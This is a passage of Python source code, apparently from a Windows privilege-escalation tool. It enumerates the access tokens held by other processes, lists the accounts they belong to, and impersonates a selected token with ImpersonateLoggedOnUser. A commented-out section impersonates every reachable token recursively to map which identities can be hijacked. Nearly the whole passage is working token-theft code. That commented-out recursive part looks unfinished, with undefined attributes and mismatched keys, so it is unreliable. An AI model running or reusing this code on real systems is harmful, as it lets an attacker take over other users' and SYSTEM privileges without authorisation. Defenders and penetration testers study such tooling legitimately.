        self.closeAllHandles(allTokens)
        return status

    def getTokensAccessibleByAccountName(self, targetPID=None, oneMaxByPid=False, _useThreadMethod=False):
        '''
        Get all tokens accessible by account name and PID

        By default, 'handle' methode is used for getting impersonation tokens.
        See getAllTokensAccessible() for details.
        :param targetPID: Targeted pid or None if you want target all processes.
        :param oneMaxByPid: max one token info by pid (first one)
        :param _useThreadMethod: If enabled, use the "thread" method for getting impersonation tokens. "Handles" method
                                 by default.
        :return: None if an error. Otherwise returns {['sid', 'accountname1']:[pidx, pidy, pidz, etc], etc}
        '''
        info = {}
        if _useThreadMethod == True:
            allTokens = self.getAllTokensAccessibleViaThreads(targetPID=targetPID)
        else:
            allTokens = self.getAllTokensAccessible(targetPID=targetPID)
        if allTokens == None:
            return None
        for aPID in allTokens:
            for aTokenInfo in allTokens[aPID]:
                sid = aTokenInfo['sid']
                accountName =  aTokenInfo['accountname']
                account = (sid, accountName['Domain'], accountName['Name'])
                if account in info:
                    if aPID not in info[account]:
                        info[account].append(aPID)
                else:
                    info[account] = [aPID]
        return info

    def impersonateThisToken(self, pid, iHandle):
        '''
        Try to impersonate a primary or impersonation token according to parameters.

        If pid & iHandle are given, try to impersonate the token located on the handle number iHandle of the process
        with the specified pid. If iHandle is set to None, the primary token of pid will be impersonated.
        printSystemTokensAccessible() can be used for choosing a token.
        :param pid: selected pid
        :param iHandle: id of the handle to the impersonation token. Use None for impersonating primary token of pid.
        :return: True if impersonated or False
        '''
        if iHandle == None:
            logging.info("Trying to impersonate the primary token of the pid {0}...".format(pid))
            return self.impersonateViaPID(pid)
        else:
            logging.info("Trying to impersonate Token located in pid {0}, handle {1}...".format(pid, iHandle))
        allTokens = self.getAllTokensAccessible(targetPID=pid)
        if allTokens == None:
            logging.warning("No one token found in pid {0}, impossible to impersonate selected token".format(pid))
            return False
        for aPID in allTokens:
            for aTokenInfo in allTokens[aPID]:
                if aTokenInfo['ihandle'] == iHandle:
                    logging.info("Selected token found, trying to impersonate it...")
                    try:
                        ImpersonateLoggedOnUser(aTokenInfo['token'])
                    except Exception as e:
                        logging.warning("Impossible to impersonate selected token: {0}".format(e))
                        return False
                    logging.info("Impersonation SUCCESS: token located in pid {0}, handle {1}, is impersonated for current thread now".format(pid, iHandle))
                    logging.info("Current username for thread: {0} ({1})".format(repr(getCurrentUsernameW()), GetCurrentUsername()))
                    return True
        logging.warning("Impersonation failed: token located in pid {0}, handle {1}, was not found. Impossible to impersonate it".format(pid, iHandle))
        return False

    def printTokensAccessibleByAccountNameAndPID(self, targetPID=None, oneMaxByPid=False, _useThreadMethod=False):
        '''
        Print all tokens accessible by account name and PID

        By default, 'handle' methode is used for getting impersonation tokens.
        See getAllTokensAccessible() for more details.
        :param targetPID: Targeted pid or None if you want target all processes.
        :param oneMaxByPid: max one token info by pid (first one)
        :param _useThreadMethod: If enabled, use the "thread" method for getting impersonation tokens. "Handles" method
                                 by default.
        :return: True or False
        '''
        print("Tokens which are accessible from current process:")
        allTokens = self.getTokensAccessibleByAccountName(targetPID=targetPID,
                                                          oneMaxByPid=oneMaxByPid,
                                                          _useThreadMethod=_useThreadMethod)
        if allTokens == None:
            return False
        for anAccount in allTokens:
            print("- {0} ({1}\{2}) : {3}".format(anAccount[0], anAccount[1], anAccount[2], allTokens[anAccount]))

    def printTokensAccessibleByPID(self, targetPID=None, impPossibleOnly=False, _useThreadMethod=False):
        '''
        Print all tokens accessible by PID

        By default, 'handle' methode is used for getting impersonation tokens.
        See getAllTokensAccessible()
        :param targetPID: Targeted pid or None if you want target all processes.
        :param impPossibleOnly: print when impersonation is possible only
        :param _useThreadMethod: If enabled, use the "thread" method for getting impersonation tokens. "Handles" method
                                 by default.
        :return: True or False
        '''
        print("Tokens which are accessible from current process:")
        if _useThreadMethod == True:
            allTokens = self.getAllTokensAccessibleViaThreads(targetPID=targetPID)
        else:
            allTokens = self.getAllTokensAccessible(targetPID=targetPID)
        if allTokens == None:
            return False
        for aPID in allTokens:
            print("- PID {0}:".format(aPID))
            accountPrinted = []
            for aTokenInfo in allTokens[aPID]:
                accountName = aTokenInfo['accountname']
                canimpersonate = '?'
                if 'canimpersonate' in aTokenInfo:
                    canimpersonate = aTokenInfo['canimpersonate']
                account = (aTokenInfo['sid'], accountName['Domain'], accountName['Name'], canimpersonate)
                if account in accountPrinted:
                    pass
                else:
                    message = "\t- {0}: {1}\{2} (possible imp: {3})".format(aTokenInfo['sid'], accountName['Domain'], accountName['Name'], canimpersonate)
                    if impPossibleOnly == True:
                        if canimpersonate == True:
                            print(message)
                            accountPrinted.append(account)
                    else:
                        print(message)
                        accountPrinted.append(account)
            if len(accountPrinted)==0:
                print("\t- None")
        self.closeAllHandles(allTokens)
        return True

    def printAllTokensAccessibleWithRecursiveImpersonation(self, targetPID=None, printFull=True, printLinked=False):
        '''
        Print all tokens (primary and impersonate) of each process recursively or from a specific process, recursively.

        Impersonate each token accessible and get all tokens accessibles. For each token accessible, impersonate the
        the token and get all tokens accessible. All is done recursively. A token is not impersonated twice.
        'handle' methode is used for getting tokens.
        :param targetPID: Targeted pid for starting or None if you want target all processes from the beginning.
        :param printFull: Print all information about each token if enabled.
        :param printLinked: Print the linked token if enabled.
        :return: True or False
        '''
        tokensTree = self.getAllTokensAccessibleRecursively()
        print(RenderTree(tokensTree, style=anytree.render.AsciiStyle()))

    '''
    def getAllTokensAccessibleRecursively(self,
                                          _pid=None, #PID of the current process running
                                          _rnode=None, #Initial/first node (aprent of all nodes)
                                          _pnode=None, #Parent Node
                                          _cpid=None, #PID of the token process impersonated
                                          _ihandle=None, #Current iHandle for current pid (_cpid)
                                          _timp=[], #List of tokens impersonated for the moment e.g. [(pid, ihandle), etc]
                                          ):
        """
        Get all tokens which are accessible recursively with impersonation

        For each token which is accessible, the function impersonates the token and get all tokens which are
        accessible (from this impersonated token). This procecude is done recursively. If the token has already
        been impersonated, the token is skipped.
        :param pid: selected pid
        :param iHandle: id of the handle to the impersonation token. Use None for impersonating primary token of pid.
        :return: a tree if pid is not given. Otherwise returns the token (pid,iHandle)
        """
        logging.debug("Getting all tokens recursively and impersonating all tokens accessible...")
        if _cpid == None:
            _cpid = GetCurrentProcessId()
            _pid  = _cpid
            print("Current PID: {0}".format(_cpid))
        if _rnode == None:
            _rnode = Node('({0},{1})'.format(_cpid, _ihandle), cpid=_cpid, ihandle=_ihandle)
            _pnode =_rnode
        logging.debug("All Impersonated: {0}".format(_timp))
        logging.debug('Entering: {0}: {1}-{2}'.format(_pnode, _cpid, _ihandle))
        allTokens = self.getAllTokensAccessible(targetPID=None, impersonation=True, full=False, avoidPID=[_pid])
        if allTokens == None:
            #Stop recursion
            logging.debug("No token for {0}: end of branch. Passing.".format(_rnode))
            pass
        else:
            for aPID in allTokens:
                for aTokenInfo in allTokens[aPID]:
                    theTokenID = (aPID, aTokenInfo['ihandle'])
                    #if isTokenAlreadyDone(rnode=_rnode, pid=aPID, ihandle=aTokenInfo['ihandle']) == False:
                    if theTokenID not in _timp:
                        _timp.append(theTokenID)
                        #Creating node
                        self.printTokens(allTokens={aPID:[aTokenInfo]}, printFull=False, printLinked=False)
                        cnode = Node(theTokenID,
                                     parent=_pnode,
                                     cpid=aPID,
                                     ihandle=aTokenInfo['ihandle'])
                        logging.debug('Impersonating: {0}'.format(cnode))
                        #Impersonating
                        # Terminate last impersonation and impersonating new token
                        #if len(_timp)!=0:
                        #    self.terminateImpersonation()
                        try:
                            ImpersonateLoggedOnUser(aTokenInfo['token'])
                        except Exception as e:
                            logging.warning("Impossible to impersonate selected token: {0}".format(e))
                        else:
                            self.closeHandle(aTokenInfo['token'])
                            # Recursion
                            self.getAllTokensAccessibleRecursively(_pid=_pid,
                                                                  _rnode=_rnode,
                                                                  _pnode=cnode,
                                                                  _cpid=aPID,
                                                                  _ihandle=aTokenInfo['ihandle'],
                                                                   _timp=_timp)
                            #Terminate impersonation
                            self.terminateImpersonation()
                    else:
                        logging.debug('Skipping: {0}: {1}'.format(_pnode, theTokenID))
            #Free handles and memory
            self.closeAllHandles(allTokens)
            allTokens.clear()
        return _rnode

    
    def impersonateThisTokenRecursively(self, pid, iHandle):
        """
        Try to impersonate a primary or impersonation token according to parameters using recursive impersonation

        If pid & iHandle are given, try to impersonate the token located on the handle number iHandle of the process
        with the specified pid. If iHandle is set to None, the primary token of pid will be impersonated.
        printSystemTokensAccessible() can be used for choosing a token.
        :param pid: selected pid
        :param iHandle: id of the handle to the impersonation token. Use None for impersonating primary token of pid.
        :return: True if impersonated or False if an error
        """
        logging.debug("Getting a tree first...")
        tokensTree = self.getAllTokensAccessibleRecursively()
        node = find(tokensTree, lambda node: (node.cpid==pid and node.ihandle==iHandle), stop=None, maxlevel=None)
        if node==None:
            logging.error("Impossible to found the token {0}:{1}".format(pid, iHandle))
            return False
        else:
            print('----------------',node.path)
            print('----------------', node)
            for aNodeToTarget in node.path:
                allTokens = self.getAllTokensAccessible(targetPID=pid,impersonation=False, full=False)
                if node.pid not in allTokens:
                    logging.debug("No token for pid {0}, stopping...".format(node.pid))
                for aTokenInfo in allTokens[node.pid]:
                    if aTokenInfo['iHandle']==node.ihandle:
                        #we have found the good token for impersonation
                        ImpersonateLoggedOnUser(aTokenInfo['token'])
                self.closeAllHandles(allTokens)
            logging.info("The token {0}:{1} has been impersonated successfully")
            return True
    '''